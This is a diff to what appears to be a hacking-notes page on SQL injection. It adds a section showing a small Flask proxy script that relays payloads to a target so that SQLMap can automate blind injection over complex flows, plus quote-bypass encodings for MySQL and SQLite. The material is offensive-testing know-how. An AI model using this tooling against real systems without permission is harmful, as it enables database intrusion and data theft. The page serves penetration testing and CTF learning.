@@ -34,11 +34,54 @@ Also try 'Second-Order' injection, by doing another injection inside of your `UN
 ### Filter Bypass
 
 Some scenarios where you can bypass character limits using functions or special syntax. \
-**`+`** means supported in more than just the mentioned DB backend.
+**`+`** here means supported in more than just the mentioned DB backend.
 
 * Quotes (`'` & `"`) like `"j0r1an"`:&#x20;
   * Use `0x6a307231616e` in **MySQL**: [CyberChef](https://gchq.github.io/CyberChef/#recipe=To\_Hex\('None',0\)Find\_/\_Replace\(%7B'option':'Regex','string':'.\*'%7D,'0x$%26',false,false,false,false\)\&input=ajByMWFu)
   * Use [`char(106,48,114,49,97,110)`](https://www.sqlite.org/lang\_corefunc.html#char) in **SQLite+**: [CyberChef](https://gchq.github.io/CyberChef/#recipe=To\_Decimal\('Comma',false\)Find\_/\_Replace\(%7B'option':'Regex','string':'.\*'%7D,'char\($%26\)',false,false,true,true\)\&input=ajByMWFu)
+
+### Custom Wrapper (complex injections)
+
+While most inputs are as simple as a query or body parameter, not all flows are like this. Interactions sometimes require special headers or formatting of the input, or the result of your action might only be visible on a different page. In these scenarios, SQLMap can fall short in its customization because it simply does not support everything.&#x20;
+
+One clever solution to this is from a case where the hacker had to automate a blind SQL injection over a websocket. These are normally not possible in SQLMap, so you might think you need to create a custom script to extract all data slowly. While this is possible, an easier alternative is to **create a wrapper script** that makes it easy for SQLMap.&#x20;
+
+{% embed url="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html" %}
+Writing a custom wrapper server for SQLMap to make exploitation easier
+{% endembed %}
+
+By creating a simple web server with a single query parameter as the payload, you can implement the full interaction in Python and then send back the result to SQLMap. You may do this for any kind of complex interaction with a server like this:
+
+<pre class="language-python" data-title="proxy.py"><code class="lang-python">from flask import Flask, request
+import requests
+
+app = Flask(__name__)
+
+def interact(payload):
+    print(f"Payload: {payload}")
+    # Example complex interaction
+<strong>    requests.post("https://example.com/save", json={"input": payload})
+</strong><strong>    r = requests.get("https://example.com/get_result")
+</strong><strong>    return r.text
+</strong>
+@app.route('/')
+def index():
+    payload = request.args.get('id')
+    return interact(payload)
+
+if __name__ == '__main__':
+    app.run(debug=False)
+</code></pre>
+
+Then run your server locally, and target _it_ instead of the regular target to proxy the traffic with your custom format and logic:
+
+```bash
+sqlmap -u 'http://localhost:5000/?id=1'
+```
+
+{% hint style="warning" %}
+**Warning**: Performing this technique multiple times may make SQLMap cache results from a previous run because the same localhost URL is used. To ensure it starts completely fresh, clear the session every time using the `--flush-session` argument.
+{% endhint %}
 
 ## SQLite
 
